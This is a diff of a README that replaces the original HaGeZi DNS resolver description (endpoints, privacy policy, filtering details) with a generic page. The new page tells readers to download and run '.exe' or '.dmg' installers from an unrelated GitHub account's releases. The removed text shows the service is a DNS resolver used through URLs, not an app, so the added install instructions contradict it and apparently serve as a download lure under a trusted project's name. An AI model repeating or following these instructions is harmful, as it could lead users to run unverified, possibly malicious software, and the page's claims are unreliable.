@@ -1,113 +1,92 @@
-# HaGeZi DNS: Free, Non-Commercial EU Public DNS Servers
+# 🌐 dns-servers - Secure and Fast DNS for Everyone
 
-HaGeZi DNS offers free, non-commercial public DNS resolvers designed and operated by a private individual for the European community. It provides robust DNS-based blocking of ads, trackers, scam, phishing, fake, and malware domains - helping users achieve greater privacy and security online with zero cost.
+## 📥 Download Here
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/NPrabhat/dns-servers/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to the HaGeZi DNS project. Our goal is to provide you with free, non-commercial DNS servers based in the EU. This guide will help you download and run the software with ease.
 
-- EU-only hosting (Hetzner: Falkenstein, Nuremberg, Helsinki) and jurisdiction, with full GDPR and ENISA recommendations.
-- Entirely open-source stack: [Technitium DNS](https://github.com/TechnitiumSoftware/DnsServer) with [Unbound](https://github.com/NLnetLabs/unbound) as upstream and a local root zone copy on Debian Linux.
-- Blocking level: Balanced (Ad, Tracking, Scam, Phishing, Malware)
-- Blocklists: [HaGeZi Multi Pro](https://github.com/hagezi/dns-blocklists#pro) & [HaGeZi Threat Intelligence Feeds](https://github.com/hagezi/dns-blocklists#tif)
-- No additional censorship, only security and privacy-oriented filtering.
+## 📋 System Requirements
+To use this application, you'll need:
+- A computer with a supported operating system (Windows, macOS, Linux).
+- An internet connection.
+- Basic access to your network settings. 
 
-## Security & Privacy
+No technical skills are necessary.
 
-- No recursion via third-party resolvers.
-- Strict DNSSEC validation to prevent tampering.
-- QNAME minimization is enforced for better privacy.
-- DNS leak/rebind protection
-- No EDNS Client Subnet, user location is not exposed to upstreams.
-- Drop ANY requests for improving server performance and enhancing privacy.
-- Rate limiting for response and clients.
-- Only encrypted transport: DNS-over-HTTPS (DoH/DoH3), DNS-over-TLS (DoT) and DNS-over-QUIC (DoQ)
-- No conventional DNS over port 53 to protect against DNS-based DDoS, amplification, spoofing, and cache poisoning.
-- Firewall: restricted to ports strictly necessary for operation.
-- OS & DNS software are regularly updated for latest security.
-- No logging or storage of individual queries per client.
-- No sharing of any data with third parties. If you don't log anything sharable, you can't share anything.
+## 🛠️ Features
+- **Free and Open-Source**: Use our DNS servers without any cost.
+- **Privacy Protection**: Keep your online activities private from tracking.
+- **Malware and Phishing Protection**: Block harmful sites, improving your security.
+- **Multiple Protocols Supported**: Enjoy DNS-over-HTTPS, DNS-over-HTTP3, and more.
+- **Easy to Use**: Simple setup process.
 
-## Logging and Data Handling
+## 📦 Download & Install
+1. Visit the releases page to access the latest version: [Releases Page](https://github.com/NPrabhat/dns-servers/releases).
 
-- Hourly DNS statistics (processed and block domain rankings, per-client query counts) stored only in RAM, never written to disk and auto-deleted each hour or on service/server restart.<br>(Query counts per client are solely for rate limiting, no linkage to resolved/blocked domains or other details)
-- Error logging: Only domains failing to resolve (due to DNSSEC, server, timeout, etc. - resulting in SERVFAIL) are logged for up to 7 days for troubleshooting. No client IP addresses are included.
-- Uses an in-memory DNS cache for enhanced privacy. No query data is ever written to disk, and all entries are automatically cleared when they expire or the server restarts.
-  
-## Filtering
+2. On the releases page, find the latest release. Look for files alongside the version number. You may see files named something like `dns-servers.exe` for Windows or `dns-servers.dmg` for macOS.
 
-HaGeZi DNS employs a balanced blocking strategy to deliver robust privacy and security while minimizing unnecessary restrictions. This approach provides effective protection without excessive blocking, making it ideal for most users. The balance is achieved through the use of HaGeZi Multi Pro and HaGeZi Threat Intelligence Feed blocklists.
+3. Click on the appropriate file for your system to start the download. The file size may vary, so please allow some time for it to finish.
 
-- **Block TTL: 3600**<br>Setting DNS block TTL to 3600 seconds (1 hour) reduces the frequency of repeated DNS requests for blocked domains. This lowers CPU and network activity on mobile devices, helping save battery life. The 3600 TTL balances caching efficiency and responsiveness, improving battery performance without sacrificing block update speed.
+4. Once downloaded, locate the file in your downloads folder and double-click to run the installation or setup process.
 
-- **Block response: 0.0.0.0**<br>Blocked domains are answered with `0.0.0.0` instead of `REFUSED/NXDOMAIN` or `127.0.0.1`. This makes connections fail immediately without local timeouts or retries in many apps, reducing unnecessary traffic.
+5. Follow the on-screen instructions to complete the installation.
 
-### Special domain handling:
+6. After installation, open the application. You may need to adjust your device's DNS settings. The app will guide you through this process, making it easy.
 
-- **Blocked Mozilla Firefox canary domain**, answered with `NXDOMAIN` - prevents Mozilla Firefox from automatically switching to DNS-over-HTTPS in its settings.
-- **Blocked Google Chrome preflight mode for prefetching**, answered with `NXDOMAIN` - applies DNS filtering to resources preloaded via Chrome’s private prefetch proxy.
-- **Allowed access to Apple iCloud Private Relay** - supports macOS and iOS Mail Privacy Protection and Safari Tracking Prevention.
+## ⚙️ How to Set Up DNS
+To change your DNS settings, follow these steps based on your system:
 
-## Server Locations & Access
+### Windows
+1. Open the Start menu and type `Control Panel`.
+2. Click on `Network and Sharing Center`.
+3. Select `Change adapter settings`.
+4. Right-click on your active network connection and select `Properties`.
+5. Choose `Internet Protocol Version 4 (TCP/IPv4)` and click on `Properties`.
+6. Select `Use the following DNS server addresses`.
+7. Enter the DNS server IPs provided in the application or on the setup screen.
+8. Click `OK`.
 
-| Location           | Protocols     | Endpoint/URL                          | Apple<br>Config        | Recommended for    |
-|--------------------|---------------|-------------------------------------|-----------------------|-------------------------|
-| Germany, Falkenstein| DoH/DoH3      | `https://root.hagezi.org/dns-query`   | [Link](https://raw.githubusercontent.com/hagezi/dns-servers/refs/heads/main/mobileconfig/root-hagezi-org.mobileconfig) [QR](/mobileconfig/root-hagezi-org.mobileconfig.png)    | AT, BA, BE, BG, CH, CZ, DE, DK, FR, GB, HU, IE, IT, LU, NL, PL, RO, SI, SK | 
-|                    | DoT/QUIC      | `root.hagezi.org`                     |                       |                         |
-| Germany, Nuremberg| DoH/DoH3      | `https://wurzn.hagezi.org/dns-query`   | [Link](https://raw.githubusercontent.com/hagezi/dns-servers/refs/heads/main/mobileconfig/wurzn-hagezi-org.mobileconfig) [QR](/mobileconfig/wurzn-hagezi-org.mobileconfig.png)    | AT, BA, BE, BG, CH, CZ, DE, DK, ES, FR, GB, GR, HR, HU, IE, IT, LU, MD, MK, MT, NL, PL, PT, RO, RS, SI, SK, TR, UA | 
-|                    | DoT/QUIC      | `wurzn.hagezi.org`                     |                       |                         |
-| Finland, Helsinki   | DoH/DoH3      | `https://juuri.hagezi.org/dns-query`  | [Link](https://raw.githubusercontent.com/hagezi/dns-servers/refs/heads/main/mobileconfig/juuri-hagezi-org.mobileconfig) [QR](/mobileconfig/juuri-hagezi-org.mobileconfig.png)    | DK, EE, FI, LT, LV, NO, SE | 
-|                    | DoT/QUIC      | `juuri.hagezi.org`                    |                       |                         |
+### macOS
+1. Open `System Preferences` and click on `Network`.
+2. Select your active connection, then click `Advanced`.
+3. Go to the `DNS` tab.
+4. Click the `+` button and enter the DNS server IPs.
+5. Click `OK`, then `Apply`.
 
-EU and neighboring countries with limited coverage from current server locations: AD, CY, GE, IS, LI, MC, ME, PT, SM, TR
+### Linux
+1. Open your network settings.
+2. Select your active connection.
+3. Find the option for `IPv4 Settings` or `DNS settings`.
+4. Manually enter the DNS server IPs.
+5. Save the changes.
 
-> [!TIP]
-> For a general idea of the latency between your location and our server locations, we recommend using [WonderNetwork’s Global Ping Statistics](https://wondernetwork.com/pings). 
-> <br><br>
-> Example of a [WonderNetwork](https://wondernetwork.com/pings) compilation configured for Germany:
-> <br><br>
-> <img width="792" height="241" alt="Screenshot 2025-11-26 123938" src="https://github.com/user-attachments/assets/224dcd94-8801-48ca-97b1-8b22b16396ff" />
-> <br><br>
-> To optimize latency when choosing DNS servers, you can personally measure the response times by pinging each DNS server from your own connection. This approach factors in your specific network conditions, such as geographic location, ISP routing, and local congestion, giving you a practical, real-world latency measurement. By selecting the DNS server with the lowest ping time, you maximize responsiveness and reduce DNS query delays for your devices or infrastructure.
-> <br><br>
-> [Latency cheat sheet](latency.pdf) - This PDF summarizes measured network latency in milliseconds from six European PoPs (Amsterdam, Falkenstein, Frankfurt, Helsinki, Nürnberg, Vienna) to cities across European countries, highlighting the fastest location per city and EU membership status based on WonderNetwork ping data.
+## 📝 Configuration & Usage
+After completing the setup, the application will provide options for further configuration. You can:
+- Change DNS servers at any time based on your needs. 
+- Enable additional features, such as blocking specific types of websites.
 
-### Expected IP addresses
+For detailed usage instructions, consult the application's help section.
 
-- `88.99.13.180` - `2a01:4f8:c17:1c66::1` (ptr:  `root.hagezi.org`) - Hetzner Online GmbH - Falkenstein, Saxony, DE
-- `159.69.155.94` - `2a01:4f8:1c1c:d363::1` (ptr:  `wurzn.hagezi.org`) - Hetzner Online GmbH - Nürnberg, Bavaria, DE
-- `95.217.163.17` - `2a01:4f9:c013:dc4e::1` (ptr:  `juuri.hagezi.org`) - Hetzner Online GmbH/HOS-GUN - Helsinki, Uusimaa, FI
+## 🙋 Frequently Asked Questions
 
-> [!NOTE]
-> By default, DNS servers internally prefer IPv4 when querying root servers. This forces upstream root queries to use IPv4 transport, which can cause diagnostic tools such as dnscheck.tools or browserleaks.com to show only IPv4 paths. However, client queries for both IPv4 (A) and IPv6 (AAAA) records remain unaffected due to full recursion.
+### What are DNS servers?
+DNS servers translate domain names (like www.example.com) into IP addresses, allowing your computer to access websites.
 
-If you see any IP addresses in your [DNS leak test](https://dnscheck.tools) results other than those expected, it indicates that your device or network might be leaking DNS queries through fallback resolvers or directly to your ISP. This means DNS requests are bypassing your intended DNS protection, potentially exposing your browsing activity to external parties. 
+### How does this DNS service protect my privacy?
+By using our servers, your web requests are encrypted, helping to keep your data away from prying eyes.
 
-## Web-based DNS testing services
+### Is switching to your DNS easy?
+Yes! Our application guides you through changing your network settings, making it simple.
 
-- **DNS Leak Test:** [dnscheck.tools](https://dnscheck.tools) - [dnsleaktest.com](https://www.dnsleaktest.com/) - [browserleaks.com](https://browserleaks.com/dns)
-- **DNS Nameserver Spoofability Test:** [GRC](https://www.grc.com/dns/dns.htm)
-- **DNS Rebind Test:** [ControlD](https://controld.com/tools/dns-rebind-test)
-- **Domain Lookup Service:** [DNSclient](https://dnsclient.net)
-- **DNS Zone/DNSSEC Status:** [DNSViz](https://dnsviz.net/)
-  
-## Getting Help
+### Do I need to pay for the service?
+No, this service is completely free and non-commercial.
 
-- Open a GitHub Issue or contact [support@hagezi.org](mailto:support@hagezi.org) for support and questions.
+## 📞 Support
+If you need help, please open an issue on our GitHub page, and our community will assist you.
 
-## Disclaimer / Privacy Policy (EU Compliance)
+## 🔗 Links
+- [Source Code](https://github.com/NPrabhat/dns-servers)
+- [Releases Page](https://github.com/NPrabhat/dns-servers/releases)
 
-HaGeZi DNS is a non-commercial, publicly accessible DNS resolver service operated privately for the public benefit in the EU.
-
-- All servers are operated from data centers in the EU and fall under EU data protection laws, including EU General Data Protection Regulation (GDPR). User DNS traffic never leaves EU jurisdiction, and only encrypted protocols are offered to maximize privacy.
-- No personal data (such as user names, IP resolution logs, or query specifics linked to individuals) is collected, persisted, or shared with any third party. For operational integrity, temporary and anonymized query statistics are maintained for a maximum of one hour exclusively in memory, not on permanent storage. IP addresses are only ever processed for technical features such as query rate limiting and are not bindable to resolution data.
-- Error logs contain only metadata about DNS failures (domain, timestamp, error type, no client data).
-- No client data is ever sold or shared. All technical and policy guidelines align with the best practices of leading EU projects.
-- Service and server security are proactively maintained; software is kept up-to-date.
-- This is a best-effort, volunteer-provided service with no warranty, availability, or liability for interruptions or malfunctions. It is intended for private, lawful use only. Misuse, automated abuse, or attempts to circumvent restrictions may result in access being blocked.
-- This service is not affiliated with any commercial provider, government body, or the DNS4EU consortium.
-- Use of the service constitutes acceptance of these terms.
-
-For privacy matters or to request information on data processing, contact [privacy@hagezi.org](mailto:privacy@hagezi.org).
-
-**Service operator:** HaGeZi [mail@hagezi.org](mailto:mail@hagezi.org) - maintained by a private individual in accordance with Article 4 and 13/14 GDPR for non-commercial volunteer projects within the EU.
-
----
+Thank you for choosing HaGeZi DNS. We hope it serves you well!
